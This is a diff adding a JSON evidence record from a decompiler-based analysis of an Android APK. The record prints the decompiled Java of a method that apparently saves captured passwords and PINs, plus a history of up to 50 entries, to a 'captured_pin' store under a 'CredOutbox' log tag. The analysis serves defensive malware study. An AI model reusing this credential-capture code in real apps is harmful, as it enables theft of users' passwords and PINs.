@@ -1,0 +1,146 @@
+{
+  "evidence_id": "ev_4cbc2ecc4728b466d570aaeb03ff4cc3fd6cbc943f39e18d34d80229c01dc8e3",
+  "subject": {
+    "name": "player_unpacked_for_analysis.apk",
+    "digest": {
+      "sha256": "e456794fcf9aa27684ea91d6e9a62fe53cc6af594a8b1aba4fa82fa539d8579a"
+    },
+    "local_path": "C:\\Users\\Romario\\Documents\\Codex\\2026-10-15\\ho\\work\\player_unpacked_for_analysis.apk",
+    "format": "apk",
+    "architecture": null
+  },
+  "provider": {
+    "id": "jadx",
+    "name": "JADX headless",
+    "version": "0.7.1"
+  },
+  "analysis_profile": null,
+  "predicate_type": "rea.analysis",
+  "operation": "inspect_android_method",
+  "parameters": {
+    "path": "C:\\Users\\Romario\\Documents\\Codex\\2026-10-15\\ho\\work\\player_unpacked_for_analysis.apk",
+    "class_name": "w1.y2",
+    "method_name": "w"
+  },
+  "raw_result": {
+    "server": {
+      "name": "rea-jadx-bridge",
+      "version": "1"
+    },
+    "bridge_sha256": "40c6972bc7e1689e09979b64ba49ba04b9c05e49976b838315d63d6415e762ba",
+    "jar_sha256": "6e5eacf500b64292bfb73c49797c1958f6ee44646e43e868039ae7feb573ff75",
+    "loaded": {
+      "state": "LOADED",
+      "apk_path": "C:\\Users\\Romario\\AppData\\Local\\Temp\\rea-android-60f5452a1caa66faa5e5135eca90818b\\target.apk",
+      "class_count": 1441,
+      "resource_count": 111,
+      "threads": 1,
+      "resources": "full"
+    },
+    "calls": [
+      {
+        "operation": "rea_jvm_status",
+        "input": {},
+        "response": {
+          "content": [
+            {
+              "type": "text",
+              "text": "{\"metadata_scope\":\"parsed_members\",\"max_heap_bytes\":4223664128,\"java_version\":\"21.0.12.1\",\"available_processors\":12,\"engine_reported_version\":\"0.7.1\"}"
+            }
+          ],
+          "isError": false
+        }
+      },
+      {
+        "operation": "load_apk",
+        "input": {
+          "path": "C:\\Users\\Romario\\AppData\\Local\\Temp\\rea-android-60f5452a1caa66faa5e5135eca90818b\\target.apk",
+          "threads": 1,
+          "resources": "full"
+        },
+        "response": {
+          "content": [
+            {
+              "type": "text",
+              "text": "{\"state\":\"LOADED\",\"apk_path\":\"C:\\\\Users\\\\Romario\\\\AppData\\\\Local\\\\Temp\\\\rea-android-60f5452a1caa66faa5e5135eca90818b\\\\target.apk\",\"class_count\":1441,\"raw_class_count\":1441,\"resource_count\":111,\"load_duration_ms\":2629,\"decompile_timeout_ms\":90000,\"threads\":1,\"code_cache_size\":64,\"resources\":\"full\"}"
+            }
+          ]
+        }
+      },
+      {
+        "operation": "get_class_summary",
+        "input": {
+          "class_name": "w1.y2"
+        },
+        "response": {
+          "content": [
+            {
+              "type": "text",
+              "text": "{\"field_count\":3,\"fields\":[{\"name\":\"f5573d\",\"type\":\"java.lang.Object\",\"def_pos\":0},{\"name\":\"f5574e\",\"type\":\"w1.y2\",\"def_pos\":0},{\"name\":\"f5575c\",\"type\":\"android.content.Context\",\"def_pos\":0}],\"methods\":[{\"is_constructor\":false,\"dex_descriptor\":\"()V\",\"signature\":\"\\u003cclinit\\u003e(): void\",\"def_pos\":0,\"name\":\"\\u003cclinit\\u003e\"},{\"is_constructor\":true,\"dex_descriptor\":\"(Landroid/content/Context;)V\",\"signature\":\"\\u003cinit\\u003e(android.content.Context): void\",\"def_pos\":0,\"name\":\"\\u003cinit\\u003e\"},{\"is_constructor\":false,\"dex_descriptor\":\"(JLjava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;\",\"signature\":\"A(long, java.lang.String, java.lang.String, java.lang.String): java.lang.String\",\"def_pos\":0,\"name\":\"A\"},{\"is_constructor\":false,\"dex_descriptor\":\"()Lw1/w2;\",\"signature\":\"B(): w1.w2\",\"def_pos\":0,\"name\":\"B\"},{\"is_constructor\":false,\"dex_descriptor\":\"(Ljava/lang/String;)Ljava/util/ArrayList;\",\"signature\":\"C(java.lang.String): java.util.ArrayList\",\"def_pos\":0,\"name\":\"C\"},{\"is_constructor\":false,\"dex_descriptor\":\"()Ljava/util/ArrayList;\",\"signature\":\"D(): java.util.ArrayList\",\"def_pos\":0,\"name\":\"D\"},{\"is_constructor\":false,\"dex_descriptor\":\"(Ljava/util/ArrayList;)V\",\"signature\":\"E(java.util.ArrayList): void\",\"def_pos\":0,\"name\":\"E\"},{\"is_constructor\":false,\"dex_descriptor\":\"(Ljava/lang/String;Ljava/util/List;)V\",\"signature\":\"F(java.lang.String, java.util.List): void\",\"def_pos\":0,\"name\":\"F\"},{\"is_constructor\":false,\"dex_descriptor\":\"()V\",\"signature\":\"G(): void\",\"def_pos\":0,\"name\":\"G\"},{\"is_constructor\":false,\"dex_descriptor\":\"()V\",\"signature\":\"d(): void\",\"def_pos\":0,\"name\":\"d\"},{\"is_constructor\":false,\"dex_descriptor\":\"(Landroid/database/sqlite/SQLiteDatabase;)V\",\"signature\":\"onCreate(android.database.sqlite.SQLiteDatabase): void\",\"def_pos\":0,\"name\":\"onCreate\"},{\"is_constructor\":false,\"dex_descriptor\":\"(Landroid/database/sqlite/SQLiteDatabase;II)V\",\"signature\":\"onUpgrade(android.database.sqlite.SQLiteDatabase, int, int): void\",\"def_pos\":0,\"name\":\"onUpgrade\"},{\"is_constructor\":false,\"dex_descriptor\":\"(JLjava/lang/String;Ljava/lang/String;Ljava/lang/String;)V\",\"signature\":\"w(long, java.lang.String, java.lang.String, java.lang.String): void\",\"def_pos\":0,\"name\":\"w\"},{\"is_constructor\":false,\"dex_descriptor\":\"(Landroid/content/Context;)Lw1/y2;\",\"signature\":\"y(android.content.Context): w1.y2\",\"def_pos\":0,\"name\":\"y\"},{\"is_constructor\":false,\"dex_descriptor\":\"(Ljava/lang/String;Ljava/lang/String;FFJ)V\",\"signature\":\"z(java.lang.String, java.lang.String, float, float, long): void\",\"def_pos\":0,\"name\":\"z\"}],\"method_count\":15,\"inner_class_count\":0,\"inner_classes\":[],\"name\":\"y2\",\"full_name\":\"w1.y2\"}"
+            }
+          ],
+          "isError": false
+        }
+      },
+      {
+        "operation": "get_method_body",
+        "input": {
+          "class_name": "w1.y2",
+          "method_name": "w",
+          "overload_index": 0,
+          "smali_fallback": true
+        },
+        "response": {
+          "content": [
+            {
+              "type": "text",
+              "text": "{\"body\":\"    public final void w(long j3, String str, String str2, String str3) {\\r\\n        String strA \\u003d A(j3, str, str2, str3);\\r\\n        if (strA \\u003d\\u003d null) {\\r\\n            return;\\r\\n        }\\r\\n        if (j3 \\u003c\\u003d 0) {\\r\\n            j3 \\u003d System.currentTimeMillis();\\r\\n        }\\r\\n        String str4 \\u003d \\\"[]\\\";\\r\\n        Context context \\u003d this.f5575c;\\r\\n        SharedPreferences sharedPreferences \\u003d context.getSharedPreferences(\\\"captured_pin\\\", 0);\\r\\n        try {\\r\\n            String string \\u003d sharedPreferences.getString(\\\"password_history\\\", \\\"[]\\\");\\r\\n            if (string !\\u003d null \\u0026\\u0026 !string.isEmpty()) {\\r\\n                str4 \\u003d string;\\r\\n            }\\r\\n            JSONArray jSONArray \\u003d new JSONArray(str4);\\r\\n            JSONObject jSONObject \\u003d new JSONObject();\\r\\n            jSONObject.put(\\\"p\\\", str);\\r\\n            jSONObject.put(\\\"t\\\", j3);\\r\\n            jSONObject.put(\\\"m\\\", str2);\\r\\n            jSONArray.put(jSONObject);\\r\\n            while (jSONArray.length() \\u003e 50) {\\r\\n                jSONArray.remove(0);\\r\\n            }\\r\\n            sharedPreferences.edit().putString(\\\"password_history\\\", jSONArray.toString()).apply();\\r\\n        } catch (Throwable th) {\\r\\n            a0.a.p(th, new StringBuilder(\\\"history append fail: \\\"), \\\"CredOutbox\\\");\\r\\n        }\\r\\n        SharedPreferences.Editor editorEdit \\u003d context.getSharedPreferences(\\\"captured_pin\\\", 0).edit();\\r\\n        if (\\\"password\\\".equals(str2)) {\\r\\n            editorEdit.putString(\\\"password\\\", str);\\r\\n        } else if (\\\"pin\\\".equals(str2)) {\\r\\n            editorEdit.putString(\\\"pin\\\", str);\\r\\n        }\\r\\n        editorEdit.apply();\\r\\n        Log.i(\\\"CredOutbox\\\", \\\"commitment enqueued id\\u003d\\\" + strA + \\\" mode\\u003d\\\" + str2 + \\\" provenance\\u003d\\\" + str3 + \\\" len\\u003d\\\" + str.length());\\r\\n    }\",\"overload_count\":1,\"method_name\":\"w\",\"markers\":[],\"mode\":\"java\",\"full_name\":\"w1.y2.w\",\"class_name\":\"w1.y2\",\"overload_index\":0,\"fell_back\":false}"
+            }
+          ],
+          "isError": false
+        }
+      }
+    ]
+  },
+  "normalized_result": {
+    "engine": {
+      "name": "jadx-headless-mcp",
+      "version": "0.7.1",
+      "artifact_sha256": "6e5eacf500b64292bfb73c49797c1958f6ee44646e43e868039ae7feb573ff75",
+      "source_revision": "5844800a486d2248fa949b74c9896285f5b54de2",
+      "worker_count": 1,
+      "heap_limit_mib": 4028
+    },
+    "class_name": "w1.y2",
+    "method": {
+      "name": "w",
+      "reported_signature": "w(long, java.lang.String, java.lang.String, java.lang.String): void",
+      "overload_index": 0,
+      "is_constructor": false,
+      "dex_descriptor": "(JLjava/lang/String;Ljava/lang/String;Ljava/lang/String;)V"
+    },
+    "overload_count": 1,
+    "representation": "java",
+    "body_status": "available",
+    "fell_back": false,
+    "markers": [],
+    "source": {
+      "status": "complete",
+      "text": "    public final void w(long j3, String str, String str2, String str3) {\r\n        String strA = A(j3, str, str2, str3);\r\n        if (strA == null) {\r\n            return;\r\n        }\r\n        if (j3 <= 0) {\r\n            j3 = System.currentTimeMillis();\r\n        }\r\n        String str4 = \"[]\";\r\n        Context context = this.f5575c;\r\n        SharedPreferences sharedPreferences = context.getSharedPreferences(\"captured_pin\", 0);\r\n        try {\r\n            String string = sharedPreferences.getString(\"password_history\", \"[]\");\r\n            if (string != null && !string.isEmpty()) {\r\n                str4 = string;\r\n            }\r\n            JSONArray jSONArray = new JSONArray(str4);\r\n            JSONObject jSONObject = new JSONObject();\r\n            jSONObject.put(\"p\", str);\r\n            jSONObject.put(\"t\", j3);\r\n            jSONObject.put(\"m\", str2);\r\n            jSONArray.put(jSONObject);\r\n            while (jSONArray.length() > 50) {\r\n                jSONArray.remove(0);\r\n            }\r\n            sharedPreferences.edit().putString(\"password_history\", jSONArray.toString()).apply();\r\n        } catch (Throwable th) {\r\n            a0.a.p(th, new StringBuilder(\"history append fail: \"), \"CredOutbox\");\r\n        }\r\n        SharedPreferences.Editor editorEdit = context.getSharedPreferences(\"captured_pin\", 0).edit();\r\n        if (\"password\".equals(str2)) {\r\n            editorEdit.putString(\"password\", str);\r\n        } else if (\"pin\".equals(str2)) {\r\n            editorEdit.putString(\"pin\", str);\r\n        }\r\n        editorEdit.apply();\r\n        Log.i(\"CredOutbox\", \"commitment enqueued id=\" + strA + \" mode=\" + str2 + \" provenance=\" + str3 + \" len=\" + str.length());\r\n    }",
+      "reported_total_bytes": null
+    }
+  },
+  "confidence": "derived",
+  "authority": "shipped-artifact",
+  "environment": null,
+  "limitations": [
+    "Static decompiler observations do not establish runtime behavior; the APK is never executed.",
+    "Method signatures use provider display types; DEX prototypes come from frozen JADX metadata. Display names may be aliases, and overload indices are local to this engine and artifact.",
+    "Class inventories use parsed metadata before code generation, including synthetic members that may be omitted from decompiled source. Source positions remain unknown.",
+    "Incoming reference totals count JADX using nodes. Direct invoke entries within a using method report raw DEX code-unit offsets and method indexes, but coverage is limited to those nodes and directly matched invokes; it does not establish every possible dynamic or reflective call site.",
+    "Manifest summary fields are extracted by the upstream engine; decoded XML is retained for verification. APK signatures, split APKs, native libraries and Android runtime capture are not verified by this provider."
+  ],
+  "relationship_coverage": null,
+  "locations": [],
+  "evidence_links": []
+}
